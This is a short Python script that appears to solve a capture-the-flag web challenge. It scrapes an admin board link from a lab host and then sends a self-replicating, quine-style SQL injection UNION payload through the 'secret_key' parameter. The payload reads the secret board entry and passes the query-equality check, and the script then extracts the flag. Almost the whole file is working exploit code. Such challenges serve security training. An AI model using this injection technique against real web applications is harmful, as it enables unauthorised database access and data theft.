from bs4 import BeautifulSoup
import requests
import re

def get_admin_uuid():
    result = requests.get(url)
    soup = BeautifulSoup(result.text, 'html.parser')

    return soup.find('td', {'class':'title-cell'}).find('a').attrs.get('href')

host = '172.24.218.139'
port = 10003

url = f"http://{host}:{port}"

read_board = get_admin_uuid()

payload = """'union select 1,2,3,(select content from board where title=0x736563726574),replace(replace('"union select 1,2,3,(select content from board where title=0x736563726574),replace(replace("$",char(34),char(39)),char(36),"$")#',char(34),char(39)),char(36),'"union select 1,2,3,(select content from board where title=0x736563726574),replace(replace("$",char(34),char(39)),char(36),"$")#')#"""

result = requests.get(url + read_board, params={
    'secret_key':payload
})
flag = re.findall("(flag{.*})", result.text)

assert len(flag) == 1

print(flag[0].strip())